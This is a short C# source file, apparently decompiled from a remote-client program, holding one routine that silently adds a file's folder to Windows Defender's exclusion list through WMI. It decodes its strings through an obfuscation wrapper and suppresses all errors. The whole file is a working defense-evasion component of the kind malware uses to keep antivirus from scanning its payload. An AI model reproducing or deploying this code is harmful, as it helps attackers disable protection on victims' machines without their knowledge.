using System;
using System.Collections.Generic;
using System.IO;
using System.Management;

namespace Client.Helper
{
	// Token: 0x02000014 RID: 20
	internal class WindowsDefenderExclusion
	{
		// Token: 0x06000073 RID: 115 RVA: 0x00005CAC File Offset: 0x00003EAC
		public static void Exc(string path)
		{
			try
			{
				string str = null;
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(EncryptString.Decode("root\\Microsoft\\Windows\\Defender"), EncryptString.Decode("SELECT * FROM MSFT_MpPreference")).Get())
				{
					str = ((ManagementObject)managementBaseObject)[EncryptString.Decode("ComputerID")].ToString();
				}
				string pathString = EncryptString.Decode("MSFT_MpPreference.ComputerID='") + str + EncryptString.Decode("'");
				ManagementObject managementObject = new ManagementObject(EncryptString.Decode("root\\Microsoft\\Windows\\Defender"), pathString, null);
				ManagementBaseObject methodParameters = managementObject.GetMethodParameters(EncryptString.Decode("Add"));
				List<string> list = new List<string>();
				list.Add(new FileInfo(path).Directory.FullName);
				methodParameters[EncryptString.Decode("ExclusionPath")] = list.ToArray();
				managementObject.InvokeMethod(EncryptString.Decode("Add"), methodParameters, null);
			}
			catch
			{
			}
		}
	}
}
